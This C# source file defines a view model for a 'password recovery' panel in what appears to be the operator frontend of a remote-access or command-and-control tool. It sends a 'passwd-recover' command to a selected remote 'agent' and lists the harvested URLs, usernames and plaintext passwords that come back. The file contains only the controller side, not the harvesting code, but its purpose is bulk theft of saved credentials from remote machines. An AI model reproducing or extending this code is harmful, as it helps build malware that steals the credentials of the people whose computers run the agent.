using System;
using System.Collections.ObjectModel;
using System.Threading.Tasks;
using System.Windows.Input;
using Newtonsoft.Json.Linq;
using rslm_frontend.Services;

namespace rslm_frontend.ViewModels
{
    public class PasswordRecoveryViewModel : ViewModelBase
    {
        private readonly RslmTcpClient _tcpClient;
        private readonly Action<string, string> _log;
        private readonly ObservableCollection<PasswordItem> _passwords = new ObservableCollection<PasswordItem>();
        private PasswordItem _selectedPassword;
        private string _statusText = "Ready";
        private string _targetAgentId;
        private bool _isBusy;

        public PasswordRecoveryViewModel(RslmTcpClient tcpClient, string targetAgentId, Action<string, string> log)
        {
            _tcpClient = tcpClient;
            _targetAgentId = targetAgentId ?? "";
            _log = log;

            RecoverCommand = new RelayCommand(_ => _ = RecoverAsync(), _ => _tcpClient.IsConnected && !IsBusy);
        }

        public ObservableCollection<PasswordItem> Passwords => _passwords;

        public PasswordItem SelectedPassword
        {
            get => _selectedPassword;
            set => SetProperty(ref _selectedPassword, value);
        }

        public string StatusText
        {
            get => _statusText;
            set => SetProperty(ref _statusText, value);
        }

        public string TargetAgentId
        {
            get => _targetAgentId;
            set => SetProperty(ref _targetAgentId, value);
        }

        public bool IsBusy
        {
            get => _isBusy;
            set
            {
                if (SetProperty(ref _isBusy, value))
                {
                    ((RelayCommand)RecoverCommand).RaiseCanExecuteChanged();
                }
            }
        }

        public ICommand RecoverCommand { get; }

        public async Task RecoverAsync()
        {
            if (string.IsNullOrEmpty(_targetAgentId))
            {
                StatusText = "No agent selected";
                return;
            }

            IsBusy = true;
            StatusText = "Recovering passwords...";

            try
            {
                var payload = new JObject { ["mode"] = "all" };
                var response = await _tcpClient.SendMessageAsync("passwd-recover", _targetAgentId, payload);

                if (response["payload"]?["passwords"] is JArray passwordsArray)
                {
                    _passwords.Clear();
                    foreach (var p in passwordsArray)
                    {
                        _passwords.Add(new PasswordItem
                        {
                            Url = p["url"]?.ToString() ?? "",
                            Username = p["username"]?.ToString() ?? "",
                            Password = p["password"]?.ToString() ?? "",
                            Application = p["application"]?.ToString() ?? ""
                        });
                    }
                    StatusText = $"Recovered {_passwords.Count} passwords";
                    _log("Password Recovery", $"Recovered {_passwords.Count} passwords");
                }
                else
                {
                    StatusText = "Failed to recover passwords";
                    _log("Password Recovery", "Failed to recover passwords");
                }
            }
            catch (Exception ex)
            {
                StatusText = "Error: " + ex.Message;
                _log("Password Recovery", "Error: " + ex.Message);
            }
            finally
            {
                IsBusy = false;
            }
        }

        public void Dispose()
        {
        }
    }

    public class PasswordItem : ViewModelBase
    {
        private string _url;
        private string _username;
        private string _password;
        private string _application;

        public string Url
        {
            get => _url;
            set => SetProperty(ref _url, value);
        }

        public string Username
        {
            get => _username;
            set => SetProperty(ref _username, value);
        }

        public string Password
        {
            get => _password;
            set => SetProperty(ref _password, value);
        }

        public string Application
        {
            get => _application;
            set => SetProperty(ref _application, value);
        }
    }
}
